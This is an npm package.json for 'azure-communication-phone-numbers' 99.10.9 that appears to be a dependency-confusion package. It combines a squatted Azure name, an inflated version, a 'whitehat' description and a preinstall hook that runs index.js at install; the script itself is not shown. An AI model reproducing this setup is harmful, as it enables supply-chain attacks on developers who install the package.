@@ -1,0 +1,39 @@
+{
+    "name": "azure-communication-phone-numbers",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-communication-phone-numbers@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-gu8E6agYVpCdzirXjk7fFBVZdhf8GUBzsayUOb/3FfRnwEYu5WAbI8A4xMfwHp+IAV92wwX17zkNtsNKn+g1wQ==",
+        "shasum": "a1ea5ebe32e8069f716366a9b1db90f02bac37ed",
+        "tarball": "https://registry.npmjs.org/azure-communication-phone-numbers/-/azure-communication-phone-numbers-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3597,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhonuTCRA9TVsSAnZWagAAbhIP+wUnY4qFJLlrWP56UM2F\n6Tf1LgnxsUqL8zPloOd5sfkKCpCLBlisMnN3aCg5H5cyQ0qtFvVGQsbfAKLv\nJgLIO5InY4Stu6CjqxdzjN/SrLMMrCqvi/jRSc1EedzDG8+OWzB5R+8wcB6q\nWQYA4z83bk5KSFM8w6KhzdvNRLlGgehqCfq9CkefXoPmpa0RUU5iV0xpO7LY\nt+WkcbgfIrs826LclGfqlBtVa3MC8uKqmL15sk3NBm8OXj4SQhFG6+2F7WsK\nNFzwqyuqj8TJeMNCliDa1zjSvfYGEag5du/aItWGBtvVCedplJVE9vzAnPHO\nAF68iT2HrVf1JGm31jN6QFxEb2yni6drSvuqF27uA+TKxjsFOYU1dIkdDaST\nIDbAN1VIWgFst9SaXR3CdhbUYyNiFKg5yrLDRQFl/JlRvMorR1oCJtkGpaNX\nEyEqxFxNtRiFGvs57N9uuhjznIMouvjWUtAI/D3P1PcB8cA8kWwWCoYgErpk\nkudri4OM9eT2coGIuZNBqgYwrBQo63PXS+hPV5gO74jVAfLsocxRy3XGKBsr\n3xIEUQhL62/ewa0ahuPwbxD1fTPOGCxAwWeMCQ6NdXxF1NIWWmIhlGFMa2HP\namhkSC9zON5pfOPaE7bYdF16Jl78B18pS4k7bG+edfQuJwZT0kd1VEqA+wlk\nrO/x\r\n=stHq\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-communication-phone-numbers_99.10.9_1638038419568_0.20011355994333346"
+    },
+    "_hasShrinkwrap": false
+}
